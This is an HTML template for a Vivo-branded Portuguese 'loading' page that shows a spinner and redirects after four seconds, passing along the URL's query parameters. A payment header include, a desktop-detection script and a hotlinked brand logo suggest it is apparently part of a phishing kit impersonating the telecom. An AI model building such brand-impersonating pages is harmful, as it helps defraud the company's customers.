<!DOCTYPE html>
<html lang="pt-BR">
<head>
{% include 'pagamento_head.html' %}
    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vivo - Carregando</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f8f9fa;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            display: inline-block;
            position: relative;
        }
        .loader::after,
        .loader::before {
            content: '';  
            box-sizing: border-box;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 3px solid #660099;
            position: absolute;
            left: 0;
            top: 0;
            animation: animloader 2s linear infinite;
        }
        .loader::after {
            animation-delay: 1s;
        }

        @keyframes animloader {
            0% {
                transform: scale(0);
                opacity: 1;
            }
            100% {
                transform: scale(1);
                opacity: 0;
            }
        }

        .pulse {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.7;
            }
        }

        .status-text {
            color: #660099;
            font-weight: 500;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center bg-white">
    <div class="w-full max-w-md px-4 py-8 flex flex-col items-center justify-center">
        <!-- Logo Vivo -->
        <div class="mb-12 pulse">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQEFQXkHhN29Y2v-vgW6BXT5COXFD3G5rDPuA&s" 
                 alt="Logo da Vivo em roxo com formato circular e tipografia moderna" 
                 class="w-36 md:w-44 h-auto">
        </div>
        
        <!-- Loader animado melhorado -->
        <div class="mb-8">
            <span class="loader"></span>
        </div>

        <!-- Área onde ficava o texto de status (removido conforme solicitado) -->
        <div class="text-center mb-4">
            <p class="text-lg status-text" id="status-text" style="visibility: hidden;">Carregando...</p>
        </div>
    </div>

    <script>
        // Manter a duração original de 4 segundos para cada tela de carregamento,
        // mas sem mostrar os textos de status conforme solicitado
        
        // Redirecionar após 4 segundos (sem mostrar texto)
        setTimeout(() => {
            const currentParams = new URLSearchParams(window.location.search);
            const redirectUrl = new URL("{{ redirect_url }}", window.location.origin);
            currentParams.forEach((value, key) => {
                redirectUrl.searchParams.set(key, value);
            });
            window.location.href = redirectUrl.toString();
        }, 4000);
    </script>
</body>
</html>
